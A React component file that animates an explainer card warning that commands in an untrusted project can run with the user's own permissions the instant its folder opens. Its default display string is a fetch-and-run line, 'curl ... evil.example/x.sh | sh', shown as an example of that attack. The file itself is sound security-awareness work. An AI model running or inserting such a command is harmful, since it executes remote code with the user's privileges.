import React from "react";
import type { CardProps } from "../props";
import {
  BFolderBack, BFolderFlap, BKey, FOLDER_R,
  clamp01, easeOut, easeBack, swell, at, mono, INK, MUTED, ACCENT, MONO_FONT,
} from "./BShared";

// V8 "they can run real commands with your own permissions, the second the folder opens."
// The command writes itself with no hand on it. One key badge lands at the head of the line
// and the SAME key is already lying across the folder's tab: one key, two places. The
// stopwatch never leaves 0.00 - its needle only twitches - and on "opens." the folder flips
// open on that same frame while the line takes a filled terracotta dot. It already ran.

export type InstantData = { cmd?: string; perm?: string; repo?: string };

const BADGE_W = 320, BADGE_H = 56;
const FOLD_W = 220, FOLD_X = 120, FOLD_Y = 268;
const WATCH_X = 580, WATCH_Y = 196, WATCH_W = 240, WATCH_H = 262;

const Badge: React.FC<{ k: number; fill: number; perm: string; rot?: number }> = ({ k, fill, perm, rot = 0 }) => {
  const P = (v: number) => v * k;
  const f = easeOut(fill);
  const pop = easeBack(fill);
  return (
    <div
      style={{
        width: P(BADGE_W), height: P(BADGE_H), boxSizing: "border-box",
        border: `${Math.max(1, P(2))}px ${f > 0.5 ? "solid" : "dashed"} ${f > 0.5 ? "rgba(226,226,226,0.85)" : "rgba(201,207,216,0.45)"}`,
        backgroundColor: `rgba(255,255,255,${0.06 * f})`,
        display: "flex", alignItems: "center", gap: P(10), paddingLeft: P(16),
        transform: `rotate(${rot}deg) scale(${0.9 + 0.1 * pop})`, transformOrigin: "0% 50%",
      }}
    >
      <div style={{ opacity: f, transform: `scale(${0.7 + 0.3 * pop})` }}><BKey size={P(28)} /></div>
      <span style={{ ...mono(P(26), INK), opacity: f }}>{perm}</span>
    </div>
  );
};

const Stopwatch: React.FC<{ k: number; twitch: number }> = ({ k, twitch }) => {
  const P = (v: number) => v * k;
  const ticks = [];
  for (let i = 0; i < 60; i++) {
    const major = i % 5 === 0;
    ticks.push(
      <line
        key={i} x1={120} y1={major ? 52 : 56} x2={120} y2={major ? 66 : 63}
        stroke={major ? "#E2E2E2" : "#6B7078"} strokeWidth={major ? 3 : 1.6}
        transform={`rotate(${i * 6} 120 148)`}
      />,
    );
  }
  return (
    <svg width={P(WATCH_W)} height={P(WATCH_H)} viewBox="0 0 240 262" style={{ display: "block" }}>
      <title>stopwatch</title>
      {/* crown and shoulders, the metal a real stopwatch is */}
      <rect x={106} y={2} width={28} height={16} rx={4} fill="#B9C0C8" />
      <rect x={112} y={16} width={16} height={14} fill="#8E959D" />
      <circle cx={120} cy={148} r={106} fill="#1A1C20" stroke="#C9CFD8" strokeWidth={9} />
      <circle cx={120} cy={148} r={96} fill="none" stroke="#4E545C" strokeWidth={2} />
      {ticks}
      {/* the needle: it twitches and comes straight back to twelve */}
      <g transform={`rotate(${twitch} 120 148)`}>
        <line x1={120} y1={148} x2={120} y2={74} stroke="#F2F2F2" strokeWidth={4.5} strokeLinecap="round" />
      </g>
      <circle cx={120} cy={148} r={7} fill="#C9CFD8" />
      {/* the reading, which never moves */}
      <rect x={74} y={178} width={92} height={40} fill="#0A0B0D" stroke="#4E545C" strokeWidth={1.6} />
      <text x={120} y={206} textAnchor="middle" fontFamily={MONO_FONT} fontSize={30} fill="#F2F2F2">0.00</text>
    </svg>
  );
};

export const BInstant: React.FC<CardProps & { data: InstantData }> = ({ tMs, w, beats, data }) => {
  const k = w / 972;
  const P = (v: number) => v * k;
  const cmd = data.cmd ?? "curl -s https://evil.example/x.sh | sh";
  const perm = data.perm ?? "your permissions";
  const repo = data.repo ?? "awesome-project";

  const bRun = beats.run ?? 26231;
  const bPerm = beats.permissions ?? 27731;
  const bSecond = beats.second ?? 28631;
  const bOpens = beats.opens ?? 29770;

  const typed = cmd.slice(0, Math.round(easeOut(at(tMs, bRun, 560)) * cmd.length));
  const fill = at(tMs, bPerm, 260);
  const link = easeOut(at(tMs, bPerm + 60, 340));
  const twitch = 7.5 * swell(at(tMs, bSecond, 340));
  const open = at(tMs, bOpens, 300);
  const dot = easeBack(at(tMs, bOpens, 280));
  const flash = swell(at(tMs, bOpens, 460));

  const foldH = FOLD_W * FOLDER_R;
  // the dashed run from the badge on the line down to the same badge on the folder
  const lx1 = 196, ly1 = 92, lx2 = 238, ly2 = 228;

  return (
    <div style={{ position: "absolute", inset: 0 }}>
      {/* the badge at the head of the line */}
      <div style={{ position: "absolute", left: P(56), top: P(32) }}>
        <Badge k={k} fill={fill} perm={perm} />
      </div>
      {/* the elbow that ties the badge to the line it governs */}
      <div style={{ position: "absolute", left: P(66), top: P(90), width: Math.max(1, P(2)), height: P(16), backgroundColor: MUTED, opacity: 0.5 }} />

      {/* a bare command line: no window, no caret, it writes itself */}
      <div style={{ position: "absolute", left: P(56), top: P(106), display: "flex", alignItems: "center", gap: P(10) }}>
        <span style={{ ...mono(P(28), MUTED) }}>$</span>
        <span style={{ ...mono(P(28), INK), opacity: 0.9 + 0.1 * flash }}>{typed}</span>
        <div
          style={{
            width: P(22), height: P(22), borderRadius: "50%", backgroundColor: ACCENT,
            marginLeft: P(8), opacity: clamp01(dot * 1.6), transform: `scale(${0.4 + 0.6 * dot})`,
          }}
        />
      </div>

      {/* the same key, lying across the folder's tab */}
      <svg
        width={P(972)} height={P(576)} viewBox={`0 0 ${972} ${576}`}
        style={{ position: "absolute", left: 0, top: 0, opacity: link * 0.55 }}
      >
        <title>the same permission</title>
        <line
          x1={lx1} y1={ly1} x2={lx1 + (lx2 - lx1) * link} y2={ly1 + (ly2 - ly1) * link}
          stroke={MUTED} strokeWidth={2} strokeDasharray="7 7"
        />
      </svg>
      <div style={{ position: "absolute", left: P(96), top: P(228), opacity: clamp01(fill * 2) }}>
        <Badge k={k} fill={fill} perm={perm} rot={-4} />
      </div>

      {/* the folder: still wearing the shield, and it opens on the word */}
      <div style={{ position: "absolute", left: P(FOLD_X), top: P(FOLD_Y), width: P(FOLD_W), height: P(foldH) }}>
        <BFolderBack w={P(FOLD_W)} open={open} uid="inst" />
        <BFolderFlap w={P(FOLD_W)} open={open} uid="inst" shield={1} />
      </div>
      <div
        style={{
          position: "absolute", left: 0, top: P(FOLD_Y + foldH + 12), width: P(FOLD_X * 2 + FOLD_W),
          textAlign: "center", ...mono(P(26), MUTED),
        }}
      >
        {repo}
      </div>

      {/* the clock that proves "the second" */}
      <div style={{ position: "absolute", left: P(WATCH_X), top: P(WATCH_Y) }}>
        <Stopwatch k={k} twitch={twitch} />
      </div>
    </div>
  );
};
